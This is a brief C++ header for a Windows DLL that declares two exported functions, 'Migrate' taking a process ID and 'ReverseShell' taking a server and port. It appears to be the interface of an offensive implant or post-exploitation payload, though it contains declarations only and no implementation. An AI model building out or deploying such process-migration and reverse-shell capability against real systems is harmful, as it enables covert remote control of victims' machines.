#ifndef EXPORTS_H_INCLUDED
#define EXPORTS_H_INCLUDED

#include <cstdint>

extern "C" __declspec(dllexport) void Migrate(uint32_t pid);
extern "C" __declspec(dllexport) void ReverseShell(const char *server, const char *port);

#endif//EXPORTS_H_INCLUDED
